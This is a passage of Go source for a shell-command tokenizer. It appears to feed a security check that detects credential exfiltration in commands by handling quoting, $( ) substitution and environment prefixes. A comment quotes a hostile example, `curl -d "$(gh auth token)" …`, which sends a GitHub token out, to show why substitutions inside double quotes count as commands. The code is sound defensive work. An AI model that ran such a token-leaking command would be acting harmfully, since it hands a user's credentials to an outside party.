		if quote != 0 {
			// A SUBSTITUTION INSIDE DOUBLE QUOTES IS STILL A COMMAND. The shell
			// runs `"$(gh auth token)"` exactly as it runs it bare — the quotes
			// are about what happens to the ANSWER — and a reader that let the
			// quote swallow it read `curl -d "$(gh auth token)" …` as one word
			// and saw no command there at all. That is the shape the credential
			// law next door is written from, so it is read here rather than
			// worked around there. Single quotes are left alone, because inside
			// them the shell does not substitute either.
			if quote == '"' && letter == '$' && index+1 < len(runes) && runes[index+1] == '(' {
				index++
				resume = quote
				quote = 0
				flushSegment()
				continue
			}
			if letter == quote {
				quote = 0
				continue
			}
			word.WriteRune(letter)
			continue
		}
		// The close of a substitution that was opened inside a double quote puts
		// the quote back, so the rest of the quoted word is read as it was.
		if letter == ')' && resume != 0 {
			flushSegment()
			quote = resume
			resume = 0
			continue
		}
		switch letter {
		case '\'', '"':
			quote = letter
		case '\\':
			if index+1 < len(runes) {
				index++
				if runes[index] != '\n' {
					word.WriteRune(runes[index])
				}
			}
		case ' ', '\t', '\r':
			flushWord()
		case '\n', ';', '&', '|', '(', ')', '{', '}', '`':
			flushSegment()
		case '$':
			if index+1 < len(runes) && runes[index+1] == '(' {
				index++
				flushSegment()
				continue
			}
			word.WriteRune(letter)
		case '>':
			flushWord()
			operator := ">"
			for index+1 < len(runes) && (runes[index+1] == '>' || runes[index+1] == '&') {
				index++
				operator += string(runes[index])
			}
			words = append(words, operator)
		case '<':
			flushWord()
			words = append(words, "<")
		default:
			word.WriteRune(letter)
		}
	}
	flushSegment()
	return segments
}

// taskSegmentHead drops what stands in front of a command — the environment it
// was given and the words that only introduce it — and answers the command
// itself with the environment that was set on it.
func taskSegmentHead(segment []string) ([]string, map[string]string) {
	var assignments map[string]string
	for index, word := range segment {
		if name, value, ok := environmentAssignment(word); ok {
			if assignments == nil {
				assignments = map[string]string{}
			}
			assignments[name] = value
			continue
		}
		switch word {
		case "sudo", "env", "time", "nohup", "exec", "command", "then", "else", "do", "!":
			continue
		}
		return segment[index:], assignments
	}
	return nil, assignments
}

// environmentAssignment reads a `NAME=value` that stands in front of a command.
func environmentAssignment(word string) (string, string, bool) {
	at := strings.Index(word, "=")
	if at <= 0 {
		return "", "", false
	}
	for _, letter := range word[:at] {
		if letter != '_' && !(letter >= 'A' && letter <= 'Z') && !(letter >= 'a' && letter <= 'z') && !(letter >= '0' && letter <= '9') {
			return "", "", false
		}
	}
	return word[:at], word[at+1:], true
}
